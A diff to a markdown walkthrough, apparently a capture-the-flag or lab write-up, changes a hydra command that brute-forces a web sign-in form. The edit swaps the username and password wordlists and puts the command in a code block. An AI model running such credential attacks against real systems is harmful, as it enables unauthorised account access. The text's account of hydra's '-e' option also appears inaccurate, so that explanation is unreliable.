@@ -27,6 +27,8 @@ When doing the login on the browser in network tab the request looks like this: 
 
 So we can use the following command to perform the attack:
 
-`hydra -L Most-Popular-Letter-Passes.txt -P top-usernames-shortlist.txt -e images/WrongAnswer.gif [IP] http-post-form "/:page=signin:username=^USER^:password=^PASS^:Login=Login:Login=Login"`
+```bash
+hydra -L  top-usernames-shortlist.txt -P Most-Popular-Letter-Passes.txt -e images/WrongAnswer.gif [IP] http-post-form "/:page=signin:username=^USER^:password=^PASS^:Login=Login:Login=Login"
+```
 
 The `-e` option is used to exclude results from the page.
